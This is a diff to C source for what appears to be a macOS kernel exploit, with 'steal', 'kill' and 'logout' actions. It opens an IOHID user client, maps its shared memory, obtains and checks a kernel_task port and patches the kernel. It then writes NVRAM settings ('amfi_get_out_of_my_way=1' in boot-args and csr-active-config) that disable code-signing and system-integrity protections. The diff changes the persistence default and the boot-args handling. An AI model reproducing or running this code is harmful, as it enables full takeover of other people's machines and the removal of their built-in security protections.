@@ -110,12 +110,12 @@ int main(int argc, const char **argv)
 {
     if(argc < 2)
     {
-        LOG("Usage: %s <steal|kill|logout|wait> [nopersist]", argv[0]);
+        LOG("Usage: %s <steal|kill|logout|wait> [persist]", argv[0]);
         return 0;
     }
 
     uint32_t act;
-    bool persist = true;
+    bool persist = false;
     if     (strcmp(argv[1], "steal")  == 0) act = ACT_STEAL;
     else if(strcmp(argv[1], "kill")   == 0) act = ACT_KILL;
     else if(strcmp(argv[1], "logout") == 0) act = ACT_LOGOUT;
@@ -128,9 +128,9 @@ int main(int argc, const char **argv)
 
     if(argc >= 3)
     {
-        if(strcmp(argv[2], "nopersist") == 0)
+        if(strcmp(argv[2], "persist") == 0)
         {
-            persist = false;
+            persist = true;
         }
         else
         {
@@ -171,6 +171,9 @@ int main(int argc, const char **argv)
     {
         *ptr += slide;
     }
+
+    task_t self = mach_task_self();
+    LOG("self: 0x%x", self);
 
     // Zalloc zone sizes go up to two page sizes,
     // so in order to get out of there we go for three pages.
@@ -233,7 +236,7 @@ int main(int argc, const char **argv)
     LOG("Waiting for IOHIDUserClient...");
     do
     {
-        ret = IOServiceOpen(service, mach_task_self(), kIOHIDServerConnectType, &client);
+        ret = IOServiceOpen(service, self, kIOHIDServerConnectType, &client);
         usleep(10);
     } while(ret == kIOReturnBusy);
     if(ret != KERN_SUCCESS)
@@ -258,7 +261,7 @@ int main(int argc, const char **argv)
     mach_vm_address_t shmem_addr = 0;
     mach_vm_size_t shmem_size = 0;
     LOG("Mapping IOHID shared memory...");
-    ret = IOConnectMapMemory64(client, kIOHIDGlobalMemory, mach_task_self(), &shmem_addr, &shmem_size, kIOMapAnywhere);
+    ret = IOConnectMapMemory64(client, kIOHIDGlobalMemory, self, &shmem_addr, &shmem_size, kIOMapAnywhere);
     if(ret != KERN_SUCCESS)
     {
         LOG("IOHID shared memory not initialized yet, hold on...");
@@ -281,7 +284,7 @@ int main(int argc, const char **argv)
         }
 
         LOG("Trying to map IOHID shared memory again...");
-        ret = IOConnectMapMemory64(client, kIOHIDGlobalMemory, mach_task_self(), &shmem_addr, &shmem_size, kIOMapAnywhere);
+        ret = IOConnectMapMemory64(client, kIOHIDGlobalMemory, self, &shmem_addr, &shmem_size, kIOMapAnywhere);
         if(ret != KERN_SUCCESS)
         {
             ERR("Failed to map IOHID shared memory: %s", mach_error_string(ret));
@@ -438,6 +441,22 @@ int main(int argc, const char **argv)
     }
     LOG("kernel_task: 0x%x", kernel_task);
 
+    mach_port_array_t arr;
+    mach_msg_type_number_t num;
+    ret = mach_ports_lookup(kernel_task, &arr, &num);
+    if(ret == KERN_SUCCESS)
+    {
+        for(size_t i = 0; i < num; ++i)
+        {
+            mach_port_deallocate(self, arr[i]);
+        }
+    }
+    else
+    {
+        ERR("Failure: kernel task port is restricted.");
+        goto out4;
+    }
+
     // Patch the kernel
     LOG("Patching kernel...");
 #define KREAD(var, addr) \
@@ -581,29 +600,29 @@ do \
 
         CFDictionarySetValue(dict, CFSTR("csr-active-config"), csr_data);
 
-        CFDataRef boot_args = NULL;
+        CFStringRef boot_args = NULL;
         const char str[] = "amfi_get_out_of_my_way=1 ";
-        CFDataRef data = CFDictionaryGetValue(nvars, CFSTR("boot-args"));
-        if(data == NULL) // No boot args exist
+        CFStringRef old_args = CFDictionaryGetValue(nvars, CFSTR("boot-args"));
+        if(old_args == NULL) // No boot args exist
         {
-            boot_args = CFDataCreateWithBytesNoCopy(NULL, (const uint8_t*)str, sizeof(str) - 2, kCFAllocatorNull);
+            boot_args = CFStringCreateWithCString(NULL, str, kCFStringEncodingUTF8);
         }
-        else if(CFGetTypeID(data) != CFDataGetTypeID()) // type safety
+        else if(CFGetTypeID(old_args) != CFStringGetTypeID()) // type safety
         {
-            ERR("boot-args variable is not of type CFData");
+            ERR("boot-args variable is not of type CFString");
             goto out5;
         }
-        else if(memmem(CFDataGetBytePtr(data), CFDataGetLength(data), str, sizeof(str) - 2) != NULL) // amfi_get_out_of_my_way already set
+        else if(memmem(CFStringGetCStringPtr(old_args, kCFStringEncodingUTF8), CFStringGetLength(old_args), str, sizeof(str) - 2) != NULL) // amfi_get_out_of_my_way already set
         {
-            boot_args = CFDataCreateCopy(NULL, data);
+            boot_args = CFStringCreateCopy(NULL, old_args);
         }
         else // Have boot args, but no amfi_get_out_of_my_way
         {
-            CFMutableDataRef ba = CFDataCreateMutable(NULL, 0);
+            CFMutableStringRef ba = CFStringCreateMutable(NULL, 0);
             if(ba)
             {
-                CFDataAppendBytes(ba, (const uint8_t*)str, sizeof(str) - 1);
-                CFDataAppendBytes(ba, CFDataGetBytePtr(data), CFDataGetLength(data));
+                CFStringAppendCString(ba, str, kCFStringEncodingUTF8);
+                CFStringAppend(ba, old_args);
             }
             boot_args = ba;
         }
